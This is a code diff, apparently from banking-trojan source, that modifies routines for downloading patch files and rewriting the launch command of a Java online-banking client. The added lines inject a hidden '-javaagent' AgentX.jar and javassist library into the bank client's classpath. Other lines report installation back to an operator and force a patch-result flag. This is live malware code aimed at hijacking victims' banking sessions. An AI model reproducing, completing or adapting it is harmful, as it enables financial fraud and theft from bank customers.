@@ -471,7 +471,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 
 	const char* addUrl = 0;
 	const char* crcName = 0;
-
+/*
 	switch( javaCompatible )
 	{
 		case 1:  addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
@@ -484,11 +484,11 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
 		return false;
-
+*/
 	//загрузка файлов во временную папку
 	char Path[MAX_PATH], fileName[MAX_PATH];
 	pGetTempPathA( sizeof(Path), Path );
-
+/*
 	switch( javaVersion )
 	{
 		case 106: addUrl = "6/jar.exe"; crcName = "6_jar.exe"; break;
@@ -502,7 +502,8 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 //	File::GetTempName(jarExeFilePath);
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, jarExeFilePath, crcName ) )
 		return false;
-	
+*/
+/*
 	switch( javaVersion )
 	{
 		case 106: addUrl = "6/jli.dll"; crcName = "6_jli.dll"; break;
@@ -514,7 +515,8 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, "jli.dll" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
-
+*/
+/*
 	char* realName = 0;
 	switch( javaVersion )
 	{
@@ -527,7 +529,8 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, realName );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
-
+*/
+/*
 	crcName = addUrl = "java.exe";
 	m_lstrcpy( javaExe, Path );
 	pPathAppendA( javaExe, addUrl );
@@ -544,8 +547,8 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	//GetAllUsersProfile( Path, sizeof(Path) );
 	if( GetWorkFolder(Path) == 0 )
 		return false;
-
-	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", /*"jni.dll",*/ "client2015.jar", "AgentKP.jar", 0 };
+*/
+	const char* miscFiles[] = { "AgentX.jar"/*, "AgentPassive.jar",*/ /*"jni.dll",*/ /*"client2015.jar", "AgentKP.jar"*/, 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
@@ -925,6 +928,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				SendLogToAdmin(6); //успешная установка патча
 		};
 
+		resPatch = 2;
 		if( resPatch > 0 ) //все файлы загрузились но по какой-то причине не установлся патч
 		{
 			char buf[1];
@@ -1190,8 +1194,25 @@ static char* UpdateJavaCmdLine( const char* cmd )
 	}
 	else //javaw.exe
 	{
+/*"C:\Program Files\Java\jre6\bin\java.exe" -Xmx256m 
+-javaagent:"%AllUsersProfile%\Application Data\IBank\AgentX.jar" 
+-cp "%AllUsersProfile%\Application Data\IBank\AgentX.jar";launcher.jar;
+"%AllUsersProfile%\Application Data\IBank\lib\javassist.jar" com.bifit.launcher.Launcher*/
 		char *after1, *replaceSrc;
 		MemPtr<1024> insert1, replaceDst;
+		pwsprintfA( insert1.str(), "-javaagent:\"%s\\AgentX.jar\" ", path );
+		res = InsertAfter( ret, "-Xmx256M ", insert1.str() );
+		DBG( "--0", insert1.str() );
+		DBG( "--1", ret );
+//		char pathSinker_swing[MAX_PATH];
+//		pGetCurrentDirectoryA( pathSinker_swing, sizeof(pathSinker_swing) );
+//		const char* sinker_swing = "sinker-swing.jar";
+//		pPathAppendA( pathSinker_swing, pathSinker_swing );
+//		if( !File::IsExists(pathSinker_swing) ) sinker_swing = "sinker.jar";
+		pwsprintfA( replaceDst.str(), "\"%s\\AgentX.jar\";launcher.jar;sinker-swing.jar;sinker.jar;firmware.jar;\"%s\\lib\\javassist.jar\"", path, path );
+		res |= ReplaceInstead( ret, "launcher.jar", replaceDst.str() );
+		DBG( "--2", ret );
+/*
 		m_lstrcat( path, "\\active.dat" );
 		if( File::IsExists(path) )
 		{
@@ -1215,6 +1236,7 @@ static char* UpdateJavaCmdLine( const char* cmd )
 			//замена не всегда может сработать, поэтому если вставка after1 сработала, то все ок
 			res |= ReplaceInstead( ret, replaceSrc, replaceDst );
 		}
+*/
 	}
 	if( !res )
 	{
